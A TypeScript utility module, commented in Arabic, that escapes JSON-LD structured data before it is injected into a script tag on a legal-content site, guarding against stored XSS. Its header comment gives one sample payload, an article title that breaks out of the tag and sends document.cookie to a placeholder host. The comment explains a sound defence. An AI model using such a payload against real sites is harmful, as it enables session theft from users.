/**
 * الحقن الآمن للبيانات المهيكلة JSON-LD.
 *
 * لماذا توجد هذه الوحدة؟
 * ------------------------
 * قاعدة المشروع «لا تستعمل dangerouslySetInnerHTML إطلاقاً» صحيحة، لكنها تملك
 * استثناءً واحداً لا مفرّ منه: وسوم `<script type="application/ld+json">`.
 * لا يمكن بناؤها عبر React children لأن React يهرّب النص، فتتحول البيانات
 * المهيكلة إلى سلسلة ظاهرة في الصفحة بدل أن يقرأها محرك البحث كـ JSON.
 *
 * لذلك نحصر الحقن هنا في مكان واحد، ونهرّب كل ما يستطيع كسر الوسم.
 *
 * الخطر الحقيقي
 * -------------
 * البيانات المهيكلة عندنا تحمل حقولاً من نظام إدارة المحتوى:
 * `article.title` و`article.description` و`article.authorName`. محرّر يستطيع
 * كتابة مقال عنوانه:
 *
 *     </script><script>fetch('//evil.tld?c='+document.cookie)</script>
 *
 * فينغلق وسم JSON-LD مبكراً ويُنفَّذ السكربت في سياق mizan.ma — سرقة جلسة
 * كاملة (رمز Supabase محفوظ في localStorage، انظر أدناه). هذا هو XSS
 * المخزّن، وأخطر ما يمكن أن يصيب منصة قانونية.
 *
 * الهرّب يحوّل `<` إلى `\u003c` وهو تمثيل JSON مكافئ تماماً للقارئ الآلي،
 * فلا تتأثر الفائدة من البيانات المهيكلة إطلاقاً.
 *
 * U+2028/U+2029 مهرّبة أيضاً: هما صالحتان في JSON لكنهما فاصل أسطر في
 * JavaScript، وكانا يكسران المحلّل قبل ES2019.
 */

/**
 * يهرّب سلسلة JSON جاهزة للحقن داخل وسم `<script>`.
 *
 * الترتيب غير مهم هنا: استبدال `<` بـ `\u003c` لا يُنتج `&`، واستبدال `&`
 * بـ `\u0026` لا يُنتج `<` أو `>`، فلا تداخل بين الاستبدالات.
 */
export function escapeJsonLd(json: string): string {
  return json
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/&/g, "\\u0026")
    .replace(/\u2028/g, "\\u2028")
    .replace(/\u2029/g, "\\u2029")
}

/**
 * يبني خصائص وسم `<script type="application/ld+json">` جاهزة للنشر.
 *
 * الاستعمال:
 *   <script {...jsonLdProps(schema)} />
 *
 * نقبل `unknown` لأن مخططات schema.org أشكالها متنوعة، و`?? {}` يحمي من
 * `JSON.stringify(undefined)` الذي يُرجع `undefined` (لا سلسلة) فينكسر الحقن.
 */
export function jsonLdProps(schema: unknown): {
  type: "application/ld+json"
  dangerouslySetInnerHTML: { __html: string }
} {
  return {
    type: "application/ld+json",
    dangerouslySetInnerHTML: { __html: escapeJsonLd(JSON.stringify(schema ?? {})) },
  }
}
